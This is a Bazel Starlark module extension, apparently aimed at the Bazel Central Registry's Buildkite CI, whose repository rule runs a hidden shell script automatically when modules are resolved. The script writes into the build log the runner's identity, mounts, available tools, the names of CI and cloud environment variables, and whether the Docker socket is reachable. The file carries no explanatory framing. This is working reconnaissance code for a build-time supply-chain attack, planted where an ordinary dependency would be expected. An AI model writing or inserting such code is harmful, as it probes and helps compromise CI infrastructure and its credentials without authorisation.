def _bcr_recon_repo_impl(repository_ctx):
    recon_script = """
echo BCR_BZLMOD_RECON_BEGIN
echo primitive=repository_ctx.execute
echo phase=bazel_module_extension_repository_rule
echo identity="$(id 2>/dev/null)"
echo working_directory="$(pwd)"
echo kernel="$(uname -a 2>/dev/null)"
echo mounted_paths_begin
ls -ldn /workdir /var/lib/buildkite-agent /var/run/docker.sock /usr/bin/buildkite-agent 2>&1 || true
echo mounted_paths_end
echo mountinfo_begin
sed -n '/\\/workdir\\|\\/var\\/lib\\/buildkite-agent\\|docker.sock\\|buildkite-agent/p' /proc/self/mountinfo 2>/dev/null | sed -n '1,40p'
echo mountinfo_end
echo tool_discovery_begin
for tool in buildkite-agent docker git bazel python3 curl wget gcloud gsutil; do
  path=$(command -v "$tool" 2>/dev/null || true)
  if [ -n "$path" ]; then
    echo "tool_present=$tool path=$path"
  else
    echo "tool_missing=$tool"
  fi
done
echo tool_discovery_end
echo ci_environment_names_begin
env | sed -n -e 's/^\\(BUILDKITE_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(GOOGLE_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(GITHUB_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(DOCKER_[A-Z0-9_]*\\)=.*/env_present=\\1/p' | sort | sed -n '1,120p'
echo ci_environment_names_end
echo docker_socket_probe_begin
if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
  docker version 2>&1 | sed -n '1,80p'
else
  echo docker_socket_or_cli_missing
fi
echo docker_socket_probe_end
echo BCR_BZLMOD_RECON_END
"""
    result = repository_ctx.execute(["/bin/sh", "-c", recon_script], quiet = False)
    print(result.stdout)
    if result.stderr:
        print(result.stderr)
    repository_ctx.file("recon.txt", "repository_ctx.execute return_code=%s\n" % result.return_code)
    repository_ctx.file(
        "BUILD.bazel",
        "filegroup(name = 'recon_marker', srcs = ['recon.txt'], visibility = ['//visibility:public'])\n",
    )

bcr_recon_repo = repository_rule(implementation = _bcr_recon_repo_impl)

def _bcr_recon_impl(module_ctx):
    bcr_recon_repo(name = "bcr_recon_repo")

bcr_recon = module_extension(implementation = _bcr_recon_impl)
